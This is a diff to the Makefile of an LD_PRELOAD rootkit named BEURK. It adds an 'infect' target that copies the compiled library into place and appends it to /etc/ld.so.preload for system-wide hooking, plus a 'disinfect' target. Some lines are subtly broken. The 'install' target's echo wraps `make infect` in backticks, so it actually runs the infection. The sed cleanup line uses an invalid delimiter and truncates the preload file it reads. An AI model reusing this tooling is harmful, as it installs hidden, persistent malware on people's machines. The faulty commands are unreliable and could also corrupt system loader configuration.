@@ -8,6 +8,17 @@ BEURK_LIBRARY_NAME	?= $(shell grep -E '^LIBRARY_NAME[[:space:]]*=' $(BEURK_CONFI
 BEURK_DEBUG_LEVEL	?= $(shell grep -E '^DEBUG_LEVEL[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
 BEURK_INSTALL_DIR	?= $(shell grep -E '^INSTALL_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
 
+# do not infect the system in debug mode
+ifneq ($(BEURK_DEBUG_LEVEL), 0)
+    BEURK_LD_PRELOAD := /tmp/beurk/ld.so.preload
+    BEURK_INSTALL_DIR := /tmp/beurk
+else
+    BEURK_LD_PRELOAD := /etc/ld.so.preload
+endif
+
+# absolute install path
+BEURK_INSTALL_PATH	?= $(shell realpath -m $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME))
+
 # compiler options
 INCLUDES	:= -Iincludes
 CFLAGS		= $(INCLUDES) -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
@@ -92,16 +103,24 @@ coverage: re
 	./utils/run-tests.sh tests/quick/core/hooks
 	gcov $(COVERAGE)
 
+install:
+	@echo "Use `make infect` instead"
+	@echo "**CAREFUL**, this command infects your local system !"
+
 # infect current system with the rootkit
 infect: $(BEURK_LIBRARY_NAME)
-	@echo TODO ! && false
-	#! test -e $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
-	#cp $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
-	#echo $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME) >> /etc/ld.so.preload
+	@echo "Install in $(BEURK_INSTALL_PATH)"
+	install -d $(BEURK_INSTALL_DIR)
+	install -m 755 $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
+	echo $(BEURK_INSTALL_PATH) >> $(BEURK_LD_PRELOAD)
+	@echo "Successful infection"
 
 # uninstall the rootkit (if installed on current system)
 disinfect:
-	@echo TODO ! && false
+	@echo "Uninstall $(BEURK_INSTALL_PATH)"
+	$(RM) $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
+	sed '#$(BEURK_INSTALL_PATH)#d' $(BEURK_LD_PRELOAD) > $(BEURK_LD_PRELOAD)
+	@echo "Successful disinfection"
 
 # remove object files
 clean:
